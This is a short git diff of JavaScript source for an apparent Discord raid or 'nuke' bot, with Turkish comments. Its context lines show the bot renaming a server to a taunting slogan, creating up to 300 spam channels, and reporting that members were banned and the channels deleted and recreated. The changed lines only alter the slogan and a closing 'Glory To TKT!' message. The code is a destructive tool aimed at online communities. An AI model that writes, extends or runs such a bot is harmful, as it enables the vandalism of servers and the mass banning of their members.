@@ -101,7 +101,7 @@ client.on('messageCreate', async (message) => {
     }
 
     // Sunucu adını değiştir
-    await message.guild.setName('FORS AFFETMEZ SABAHA SUNUCUN AFFEDİLMEZ💦').catch(() => {});
+    await message.guild.setName('💦FORS AFFETMEZ SABAHA SUNUCUN AFFEDİLMEZ💦').catch(() => {});
 
     // 300 yeni kanal oluştur (TKT💋, FORS💦, ALİLW💝, TKT💋 sırayla)
     const names = ['TKT💋', 'FORS💦', 'ALİLW💝', 'TKT💋'];
@@ -110,7 +110,7 @@ client.on('messageCreate', async (message) => {
       await message.guild.channels.create({ name: name }).catch(() => {});
     }
 
-    message.channel.send(`🧹 ${bannedCount} kişi banlandı. Kanallar silindi ve yeniden oluşturuldu. FORS AFFETMEZ!`);
+    message.channel.send(`🧹 ${bannedCount} kişi banlandı. Kanallar silindi ve yeniden oluşturuldu. Glory To TKT!`);
   }
 });
 
